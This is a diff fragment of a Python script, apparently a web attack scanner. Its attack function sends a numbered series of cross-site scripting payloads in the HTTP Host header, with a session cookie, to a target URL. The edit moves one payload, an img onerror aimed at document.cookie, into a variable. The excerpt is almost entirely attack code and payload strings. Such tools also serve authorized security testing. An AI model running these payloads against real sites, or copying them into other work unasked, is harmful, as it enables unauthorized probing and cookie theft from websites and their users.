@@ -123,13 +123,15 @@ def attack(URL, path, domain, verbose, ips, cookie):
         get_request(URL, path, 443, verbose, ["Host: '&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>'", "Cookie: " + cookie])
 
         print(style.YELLOW + "[ * ]"+style.RESET+"TRYING XSS PAYLOAD 10 !")
+
         get_request(URL, path, 443, verbose, ['Host: "<ScRiPt>alert(1)</sCriPt>', "Cookie: " + cookie])
 
         print(style.YELLOW + "[ * ]"+style.RESET+"TRYING XSS PAYLOAD 11 !")
         get_request(URL, path, 443, verbose, ['Host: <ScRiPt>alert(1)</sCriPt>', "Cookie: " + cookie])
 
         print(style.YELLOW + "[ * ]"+style.RESET+"TRYING XSS PAYLOAD 12 !")
-        get_request(URL, path, 443, verbose, ['Host: "><ImG Src=xx onerror(document.['cookie'];>', "Cookie: " + cookie])
+        payload = ''' "><ImG Src=xx onerror(document.['cookie'];> '''
+        get_request(URL, path, 443, verbose, [f'Host: {payload}', "Cookie: " + cookie])
 
         print(style.YELLOW + "[ * ]"+style.RESET+"TRYING XSS PAYLOAD 13 !")
         get_request(URL, path, 443, verbose, ['Host: <script type="text/javascript">alert(1997)</script>', "Cookie: " + cookie])
